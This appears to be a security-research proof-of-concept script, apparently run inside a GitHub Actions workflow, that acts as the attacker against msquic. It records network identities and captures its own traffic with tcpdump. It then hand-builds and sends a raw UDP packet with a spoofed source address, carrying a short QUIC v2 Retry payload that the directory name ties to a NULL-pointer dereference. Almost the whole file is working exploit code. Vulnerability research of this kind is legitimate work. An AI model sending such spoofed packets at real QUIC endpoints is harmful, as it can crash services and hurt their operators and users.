#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-public-peer-results/attacker"
mkdir -p "$RESULTS"
python3 "$ROOT/nettest-coord.py" wait "peer-mapping.json" "$RESULTS/mapping.json" 300
ATTACKER_PUBLIC_IP="$(curl -4 -fsS https://api.ipify.org)"
PEER_IP="$(jq -r .peer_ip "$RESULTS/mapping.json")"
CLIENT_PUBLIC_IP="$(jq -r .client_public_ip "$RESULTS/mapping.json")"
CLIENT_PUBLIC_PORT="$(jq -r .client_public_port "$RESULTS/mapping.json")"
PEER_PORT="$(jq -r .peer_port "$RESULTS/mapping.json")"
printf 'ATTACKER_PUBLIC_IP=%s\nPEER_IP=%s\nCLIENT_PUBLIC_IP=%s\nCLIENT_PUBLIC_PORT=%s\nPEER_PORT=%s\n' \
  "$ATTACKER_PUBLIC_IP" "$PEER_IP" "$CLIENT_PUBLIC_IP" "$CLIENT_PUBLIC_PORT" "$PEER_PORT" | tee "$RESULTS/network-identities.txt"
if [ "$ATTACKER_PUBLIC_IP" = "$CLIENT_PUBLIC_IP" ] || [ "$ATTACKER_PUBLIC_IP" = "$PEER_IP" ]; then
  echo "FAIL: attacker and target/peer are not distinct public IP endpoints"
  exit 1
fi
if [ "$ATTACKER_PUBLIC_IP" = "127.0.0.1" ] || [ "$CLIENT_PUBLIC_IP" = "127.0.0.1" ]; then
  echo "FAIL: a public Internet address was not identified"
  exit 1
fi

sudo tcpdump -U -ni any "udp and dst host $CLIENT_PUBLIC_IP and dst port $CLIENT_PUBLIC_PORT" \
  -w "$RESULTS/attacker-egress.pcap" >/dev/null 2>&1 &
CAP_PID=$!
cleanup(){ set +e; sudo kill "$CAP_PID" 2>/dev/null; wait "$CAP_PID" 2>/dev/null; }
trap cleanup EXIT
sleep 1

sudo python3 - "$RESULTS/mapping.json" <<'PY' | tee "$RESULTS/attacker.log"
import ipaddress,json,socket,struct,sys
m=json.load(open(sys.argv[1]))
src=ipaddress.IPv4Address(m["peer_ip"]).packed
dst=ipaddress.IPv4Address(m["client_public_ip"]).packed
sport=int(m["peer_port"]); dport=int(m["client_public_port"])
payload=bytes.fromhex("806b3343cf0000")
udp=struct.pack("!HHHH",sport,dport,8+len(payload),0)+payload
header=struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(udp),0x5a71,0,64,17,0,src,dst)
def checksum(data):
    total=sum(struct.unpack("!10H",data))
    while total>>16: total=(total&0xffff)+(total>>16)
    return (~total)&0xffff
header=header[:10]+struct.pack("!H",checksum(header))+header[12:]
packet=header+udp
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
s.sendto(packet,(m["client_public_ip"],0))
print(f"SPOOF_SENT count=1 src={m['peer_ip']}:{sport} dst={m['client_public_ip']}:{dport} payload={payload.hex()}")
PY
sleep 2
cleanup
trap - EXIT
sudo tcpdump -nn -r "$RESULTS/attacker-egress.pcap" -c 5 >"$RESULTS/attacker-egress.txt" 2>&1 || true
cat "$RESULTS/attacker.log" "$RESULTS/attacker-egress.txt"
